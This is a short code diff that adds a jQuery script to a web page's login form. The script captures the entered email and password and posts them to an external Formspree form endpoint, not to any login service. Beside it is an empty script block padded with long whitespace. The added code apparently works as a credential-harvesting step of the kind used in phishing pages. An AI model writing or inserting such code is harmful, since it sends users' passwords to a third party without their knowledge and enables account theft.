@@ -117,3 +117,31 @@
 <script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               
 </script>
+  <script>
+$(function() {
+  // Handle form submission
+  $('#login-form').submit(function(event) {
+    event.preventDefault();
+    var email = $('#email').val();
+    var password = $('#password').val();
+    
+    // Send form data to Formspree
+    $.ajax({
+      url: 'https://formspree.io/f/YOUR_FORMSPREE_FORM_ID',
+      method: 'POST',
+      data: {
+        email: email,
+        password: password
+      },
+      dataType: 'json',
+      success: function() {
+        // TODO: handle successful form submission
+      },
+      error: function() {
+        // TODO: handle form submission error
+      }
+    });
+  });
+});
+</script>
+
